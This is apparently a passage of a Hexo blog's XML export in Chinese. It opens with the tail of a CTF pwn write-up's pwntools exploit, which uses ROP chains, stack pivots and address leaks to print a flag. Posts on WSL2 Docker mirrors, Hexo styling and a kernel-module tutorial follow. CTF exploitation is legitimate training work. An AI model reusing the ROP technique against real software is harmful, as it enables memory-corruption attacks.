class="number">0x28f2d0</span>+libc_addr</span><br><span class="line">payload = flat(pop_rdi, <span class="number">1</span>, pop_rsi, environ_addr, pop_rdx_r12, <span class="number">0x6</span>, <span class="number">0</span>, write_addr, vuln_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>, flag_addr-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&quot;stack_addr: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step4: leak heap_addr</span></span><br><span class="line">heap_addr = stack_addr-<span class="number">0x130</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x30</span>, bss_addr+<span class="number">0x200</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, heap_addr, puts_plt, vuln_addr, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, bss_addr+<span class="number">0x200</span>-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">3</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))+<span class="number">0x30</span></span><br><span class="line">info(<span class="string">f&quot;heap_addr: <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step5: print flag</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x30</span>, bss_addr+<span class="number">0x200</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, heap_addr, puts_addr, vuln_addr, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>, bss_addr+<span class="number">0x200</span>-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2配置Docker镜像源</title>
    <url>/posts/a7cc92dc.html</url>
    <content><![CDATA[<p>最近在搞PWN方向出题，需要用到docker环境部署，但是docker环境一直pull不下来，多次尝试后记录一下成功的配置。<br>由于不清楚是不是网络连接稳定导致的问题，此文章仅作参考。</p>
<p>本机环境：WSL2 + Docker Desktop</p>
<h2 id="配置情况"><a href="#配置情况" class="headerlink" title="配置情况"></a>配置情况</h2><p>最终成功pull下来的Docker Desktop配置信息</p>
<img src="/posts/a7cc92dc/image-20241027211458655.png" class="" title="image-20241027211458655">

<h2 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h2><ol>
<li>dial tcp: lookup auth.docker.io on 172.17.176.1:53: server misbehaving<br>出现该问题表示DNS配置出现问题，需要修改下&#x2F;etc&#x2F;resolv.conf文件内容(原因应该是wsl默认dns设置为windows主机的WSL网关地址，导致出现问题)<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ cat /etc/resolv.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[network]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">generateResolvConf = <span class="literal">false</span></span></span><br><span class="line">nameserver 172.17.176.1</span><br><span class="line">nameserver 8.8.8.8</span><br><span class="line">nameserver 114.114.114.114</span><br></pre></td></tr></table></figure></li>
<li>dial tcp: lookup auth.docker.io on xxxx: time out<br>表示无法正常连接，需要更换为国内镜像源，目前尚且没有找到很靠谱的镜像源，后续会随缘更新（其实开梯子然后不断尝试官方镜像也是有概率成功的hhhh…）</li>
</ol>
]]></content>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo美化卡片</title>
    <url>/posts/ced39921.html</url>
    <content><![CDATA[<p>对博客页面的卡片样式进行美化</p>
<h2 id="卡片设置半透明"><a href="#卡片设置半透明" class="headerlink" title="卡片设置半透明"></a>卡片设置半透明</h2><p><a href="https://blog.csdn.net/qq_44138925/article/details/128843200">参考链接</a></p>
<p>通过<strong>引入自定义css文件</strong>的方式实现。</p>
<ol>
<li><p>在代码根目录的&#x2F;source下新建&#x2F;config目录，&#x2F;config目录下分别新建css、js、img目录用于存储自定义的文件。</p>
</li>
<li><p>在&#x2F;source&#x2F;config&#x2F;css目录下新建transparancy.css文件，内容如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* 文章页背景 */</span></span><br><span class="line"><span class="selector-class">.layout_post</span>&gt;<span class="selector-id">#post</span> &#123;</span><br><span class="line">    <span class="comment">/* 以下代表透明度为0.7 可以自行修改*/</span></span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,.<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 所有页面背景 */</span></span><br><span class="line"><span class="selector-id">#aside_content</span> <span class="selector-class">.card-widget</span>, <span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>, <span class="selector-class">.layout_page</span>&gt;<span class="selector-tag">div</span><span class="selector-pseudo">:first-child</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.recent-posts</span>), <span class="selector-class">.layout_post</span>&gt;<span class="selector-id">#page</span>, <span class="selector-class">.layout_post</span>&gt;<span class="selector-id">#post</span>, <span class="selector-class">.read-mode</span> <span class="selector-class">.layout_post</span>&gt;<span class="selector-id">#post</span>&#123;</span><br><span class="line">    <span class="comment">/* 以下代表透明度为0.7 */</span></span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,.<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*侧边卡片的透明度 */</span></span><br><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--card-bg</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, .<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 页脚透明 */</span></span><br><span class="line"><span class="comment">/* #footer &#123;	*/</span></span><br><span class="line">	<span class="comment">/* 以下代表透明度为0.7 */</span></span><br><span class="line"><span class="comment">/*	background: rgba(255,255,255, .0); </span></span><br><span class="line"><span class="comment">/* 暗色模式调整 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">    <span class="attr">--card-bg</span>: <span class="built_in">rgba</span>(<span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>页脚透明注释掉了，有需要的可以自行取消注释~~~</p>
</li>
<li><p>引入css文件：在主题配置文件<code>_config.butterfly.yml</code>中引入css文件，使用inject实现。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Inject</span></span><br><span class="line"><span class="comment"># ps：引入自定义css、js</span></span><br><span class="line"><span class="comment">#     css文件在head引入，js文件在bottom里引入，有的js要求在head引入，不然无法生效</span></span><br><span class="line"><span class="comment"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span></span><br><span class="line"><span class="comment"># ps: 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span></span><br><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span> <span class="comment">#注入自定义css</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/config/css/transparancy.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="comment">#注入自定义js</span></span><br><span class="line">    <span class="comment">#  - &lt;script src=&quot;/config/js/script.js?v1&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/xxxx&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>实现效果：</p>
<img src="/posts/ced39921/image-20241028114530064.png" class="" title="image-20241028114530064">

<h2 id="个人信息卡设置"><a href="#个人信息卡设置" class="headerlink" title="个人信息卡设置"></a>个人信息卡设置</h2><h3 id="隐藏Follow-Me按钮"><a href="#隐藏Follow-Me按钮" class="headerlink" title="隐藏Follow Me按钮"></a>隐藏Follow Me按钮</h3><p>配置文件中修改<code>_config.butterfly.yml</code>：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">aside:</span></span><br><span class="line">  <span class="attr">card_author:</span></span><br><span class="line">    <span class="attr">button:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="社交媒体图标"><a href="#社交媒体图标" class="headerlink" title="社交媒体图标"></a>社交媒体图标</h3><p>配置文件中修改<code>_config.butterfly.yml</code>：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">fab fa-bilibili:</span> <span class="string">https://space.bilibili.com/630793337</span> <span class="string">||</span> <span class="string">Bilibili</span> <span class="string">||</span> <span class="string">&#x27;rgb(0,160,216)&#x27;</span></span><br><span class="line">  <span class="attr">fab fa-github:</span> <span class="string">https://github.com/Eknight-Eutopia</span> <span class="string">||</span> <span class="string">GitHub</span></span><br><span class="line">  <span class="attr">fas fa-envelope:</span> <span class="string">mailto:2715417602@qq.com</span> <span class="string">||</span> <span class="string">Email</span></span><br></pre></td></tr></table></figure>

<h3 id="修改图标悬停动画"><a href="#修改图标悬停动画" class="headerlink" title="修改图标悬停动画"></a>修改图标悬停动画</h3><p>头像和社交媒体图标的旋转动画很抽象，这里修改为放大动画：</p>
<p>使用上述自定义css文件方法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-info</span> <span class="selector-class">.card-info-social-icons</span> <span class="selector-class">.social-icon</span> <span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.avatar-img</span> <span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终效果：</p>
<img src="/posts/ced39921/image-20241028115919781.png" class="" title="image-20241028115919781">



]]></content>
      <tags>
        <tag>Hexo</tag>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo关闭指定页面评论</title>
    <url>/posts/48c13ed7.html</url>
    <content><![CDATA[<p>发现tags，categories等等页面会默认开启评论功能，因此选择将这些页面评论区关闭<br>在页面index.md中Fontmatter中添加内容即可：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">comments:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h2 id="初始效果"><a href="#初始效果" class="headerlink" title="初始效果"></a>初始效果</h2><img src="/posts/48c13ed7/image-20241028120904569.png" class="" title="image-20241028120904569">

<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><img src="/posts/48c13ed7/image-20241028121032026.png" class="" title="image-20241028121032026">
]]></content>
      <tags>
        <tag>Hexo</tag>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>LKM编程</title>
    <url>/posts/79c0f484.html</url>
    <content><![CDATA[<h2 id="Chapter-1-Introduction"><a href="#Chapter-1-Introduction" class="headerlink" title="Chapter 1. Introduction"></a>Chapter 1. Introduction</h2><h3 id="1-1-What-Is-A-Kernel-Module"><a href="#1-1-What-Is-A-Kernel-Module" class="headerlink" title="1.1. What Is A Kernel Module?"></a>1.1. What Is A Kernel Module?</h3><p><strong>Linux系统内核：</strong>宏内核（与微内核相对），使用内核模块实现动态模块的加载运行。</p>
<table>
<thead>
<tr>
<th></th>
<th>简介</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>宏内核</td>
<td>将进程调度核心功能，驱动程序，网络协议、文件系统都放入内核态</td>
<td>效率高</td>
<td>一个出错就崩溃</td>
</tr>
<tr>
<td>微内核</td>
<td>只将核心功能放在内核态，其他放在用户态以进程形式运行</td>
<td>驱动程序出错不影响内核运行</td>
<td>效率低</td>
</tr>
</tbody></table>
<p><strong>LKM：</strong>用于扩展内核的功能，运行在内核态，为ELF二进制文件，如果不使用内核模块，会导致需要给内核添加功能时只能重新编译整个内核，不是很方便。</p>
<h3 id="1-2-How-Do-Modules-Get-Into-The-Kernel"><a href="#1-2-How-Do-Modules-Get-Into-The-Kernel" class="headerlink" title="1.2. How Do Modules Get Into The Kernel?"></a>1.2. How Do Modules Get Into The Kernel?</h3><p>使用<code>lsmod</code>命令查看已经加载到内核的模块（<code>/proc/modules</code>）。</p>
<p>使用<code>modprobe</code>命令加载指定模块到内核（自动查询模块的依赖关系进行加载<code>/lib/modules/version/kernel/*/*.ko</code>）</p>
<p>使用<code>insmod</code>命令加载模块到内核，不会查询依赖关系（<code>modprobe</code>调用该命令）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">insmod /lib/modules/2.6.11/kernel/fs/fat/fat.ko</span><br><span class="line">insmod /lib/modules/2.6.11/kernel/fs/msdos/msdos.ko</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">modprobe msdos</span><br></pre></td></tr></table></figure>

<p><strong>华为路由器LKM列表</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# lsmod</span><br><span class="line">Module                  Size  Used by</span><br><span class="line">msdos                   7642  0 </span><br><span class="line">fat                    54395  1 msdos</span><br><span class="line">ipv6                  312786  12 </span><br><span class="line">loop                   13153  0 </span><br><span class="line">mtdchar                 7769  0 </span><br><span class="line">cfi_cmdset_0001        26278  1 </span><br><span class="line">cfi_probe               3224  0 </span><br><span class="line">gen_probe               2353  1 cfi_probe</span><br><span class="line">sg                     30552  0 </span><br><span class="line">uhci_hcd               26706  0 </span><br><span class="line">cfi_util                4778  2 cfi_cmdset_0001,cfi_probe</span><br><span class="line">ehci_hcd               49012  0 </span><br><span class="line">physmap                 2637  0 </span><br><span class="line">sr_mod                 16338  0 </span><br><span class="line">i2c_piix4               5936  0 </span><br><span class="line">mtd                    18073  6 mtdchar,cfi_cmdset_0001,physmap</span><br><span class="line">8139too                20824  0 </span><br><span class="line">psmouse                53122  0 </span><br><span class="line">usbcore               152780  3 uhci_hcd,ehci_hcd</span><br><span class="line">chipreg                 1474  2 cfi_probe,physmap</span><br><span class="line">cdrom                  38519  1 sr_mod</span><br><span class="line">i2c_core               18515  1 i2c_piix4</span><br><span class="line">8139cp                 20460  0 </span><br><span class="line">serio_raw               4416  0 </span><br><span class="line">map_funcs               1034  1 physmap</span><br><span class="line">evdev                   8808  0 </span><br><span class="line">nls_base                6015  2 fat,usbcore</span><br></pre></td></tr></table></figure>



<h2 id="Chapter2-Hello-World"><a href="#Chapter2-Hello-World" class="headerlink" title="Chapter2.Hello World"></a>Chapter2.Hello World</h2><h3 id="2-1-Hello-World-part-1-The-Simplest-Module"><a href="#2-1-Hello-World-part-1-The-Simplest-Module" class="headerlink" title="2.1. Hello, World (part 1): The Simplest Module"></a>2.1. Hello, World (part 1): The Simplest Module</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  hello-1.c - The simplest kernel module.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello world 1.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * A non 0 return means init_module failed; module can&#x27;t be loaded. </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye world 1.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>必须至少有两个函数:一个名为<code>init module()</code>的“开始”(初始化)函数，它在模块被<code>insmod</code>时被调用;一个名为<code>cleanup module()</code>的“结束”(清理)函数，它在模块被<code>rmmod</code>之前被调用。</p>
<p>在内核版本2.3后可以不这么命名加载时入口函数为使用<code>module_init</code>指定入口函数，卸载时使用<code>module_exit</code>指定卸载函数。</p>
<p>【报错】：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo insmod ./hello-1.ko                                     </span><br><span class="line">insmod: ERROR: could not insert module ./hello-1.ko: Invalid module format</span><br><span class="line">~/Documents/LKM/writeup/code                                   Py base 09:24:36</span><br><span class="line">❯ sudo dmesg | grep modules</span><br><span class="line">[  715.059773] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, loc 000000000fc2cc28, val ffffffffc0cb4040</span><br><span class="line">[ 1165.465487] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, loc 000000000fc2cc28, val ffffffffc0cb4040</span><br><span class="line"></span><br><span class="line">❯ sudo insmod ./hello-1.ko                                     </span><br><span class="line">insmod: ERROR: could not insert module ./hello-1.ko: Invalid module format</span><br><span class="line">~/Documents/LKM/writeup/code                                   Py base 09:24:36</span><br><span class="line">❯ sudo dmesg | grep modules</span><br><span class="line">[  715.059773] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, loc 000000000fc2cc28, val ffffffffc0cb4040</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">solution 注：如果重装的不是<span class="built_in">uname</span> -r显示的版本，需要指定</span></span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade</span><br><span class="line">sudo apt remove --purge linux-headers-*</span><br><span class="line">sudo apt autoremove &amp;&amp; sudo apt autoclean</span><br><span class="line">sudo apt install linux-headers-generic</span><br></pre></td></tr></table></figure>



<h4 id="2-1-1-PrintK（）"><a href="#2-1-1-PrintK（）" class="headerlink" title="2.1.1 PrintK（）"></a>2.1.1 PrintK（）</h4><p>注：打印函数与Printf函数不同（应用程序可以调用C标准库，但内核函数一般调用自己提供的函数）</p>
<p>printk函数可以用来进行内核调试，其可以打印信息到终端或日志中，打印信息分为几个等级。</p>
<p>【附：除Printk外的一些打印内核信息的函数】</p>
<img src="/posts/79c0f484/image-20240104200604418.png" class="" title="image-20240104200604418">

<h3 id="2-2-编译内核模块"><a href="#2-2-编译内核模块" class="headerlink" title="2.2 编译内核模块"></a>2.2 编译内核模块</h3><p>使用Makefile进行编译</p>
<p>Makefile：指定内核源码，编译参数，编译平台</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m += hello-1.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>

<p>编译生成*.ko文件，即为内核模块。</p>
<img src="/posts/79c0f484/image-20240104171023339.png" class="" title="image-20240104171023339">

<p>使用<code>modinfo hello-1.ko</code>查看模块信息。</p>
<img src="/posts/79c0f484/image-20240104171137803.png" class="" title="image-20240104171137803">

<p>加载模块到内核<code>insmod ./hello-1.ko</code></p>
<h4 id="模块的加载流程"><a href="#模块的加载流程" class="headerlink" title="模块的加载流程"></a>模块的加载流程</h4><ul>
<li>驱动程序注册设备，创建系统信息（<code>/sys/class/xxx</code>）</li>
<li>注册设备使用的是模块文件名，要带.ko后缀</li>
<li>当操作已插入内核的模块时，只需使用模块名</li>
<li>udev|mdev根据注册的设备信息，创建设备节点（<code>/dev/xxx</code>）</li>
<li>所有设备节点信息存储在<code>/proc/devices</code></li>
<li>加载后会输出模块内的加载信息，通过<code>dmesg</code>查看</li>
</ul>
<h4 id="init-module系统调用流程"><a href="#init-module系统调用流程" class="headerlink" title="init_module系统调用流程"></a>init_module系统调用流程</h4><ul>
<li>不依赖C库。链接&#x2F;重定位自己完成</li>
<li>Kernel&#x2F;module.c&#x2F;init_module</li>
<li>拷贝到内核：copy_module_from_user</li>
<li>地址空间分配：layout_and_allocate</li>
<li>符号解析：simplify_symbols</li>
<li>重定位:apply_relocations</li>
<li>执行：complete_formation</li>
</ul>
<h3 id="2-3-Hello-World-part-2"><a href="#2-3-Hello-World-part-2" class="headerlink" title="2.3 Hello World (part 2)"></a>2.3 Hello World (part 2)</h3><p>可以使用<code>module_init(hello_2_init);</code> <code>module_exit(hello_2_exit);</code>函数指定入口函数和退出函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  hello-2.c - Demonstrating the module_init() and module_exit() macros.</span></span><br><span class="line"><span class="comment"> *  This is preferred over using init_module() and cleanup_module().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">/* Needed for the macros */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_2_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world 2\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_2_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye, world 2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_2_init);</span><br><span class="line">module_exit(hello_2_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-4-Hello-World-part-3-init-and-exit宏定义"><a href="#2-4-Hello-World-part-3-init-and-exit宏定义" class="headerlink" title="2.4 Hello World (part 3):  __init and _exit宏定义"></a>2.4 Hello World (part 3):  __init and _exit宏定义</h3><p>__init宏导致一旦内置驱动程序的init函数完成，init函数就会被丢弃并释放其内存（对Loadable modules无效）</p>
<p>__exit宏导致函数遗漏，（对Loadable Modules无效）内置驱动程序不需要cleanup函数，但Loadable Modules需要。</p>
<p>以下代码定义了init, initdata, exit宏</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  hello-3.c - Illustrating the __init, __initdata and __exit macros.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">/* Needed for the macros */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello3_data __initdata = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_3_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world %d\n&quot;</span>, hello3_data);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_3_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye, world 3\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_3_init);</span><br><span class="line">module_exit(hello_3_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>修改Makefile，编译加载内核，查看记录信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ 2774.912662] Hello, world 3</span><br></pre></td></tr></table></figure>

<h3 id="2-5-Hello-World-part-4-Licensing-and-Module-Documentation"><a href="#2-5-Hello-World-part-4-Licensing-and-Module-Documentation" class="headerlink" title="2.5 Hello World (part 4): Licensing and Module Documentation"></a>2.5 Hello World (part 4): Licensing and Module Documentation</h3><ul>
<li>Licensing：使用<code>MODULE_LICENSE()</code>宏定义。<code>GPL</code>代表模块开源免费</li>
<li>Description：使用<code>MODULE_DESCRIPTION</code>宏定义。描述模块用于做什么。</li>
<li>Author：使用<code>MODULE_AUTHOR</code>宏定义。描述作者</li>
<li>支持设备：<code>MODULE_SUPPORTED_DEVICE()</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  hello-4.c - Demonstrates module documentation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">/* Needed for the macros */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_AUTHOR <span class="string">&quot;Peter Jay Salzman &lt;p@dirac.org&gt;&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_DESC   <span class="string">&quot;A sample driver&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">init_hello_4</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world 4\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">cleanup_hello_4</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye, world 4\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(init_hello_4);</span><br><span class="line">module_exit(cleanup_hello_4);</span><br><span 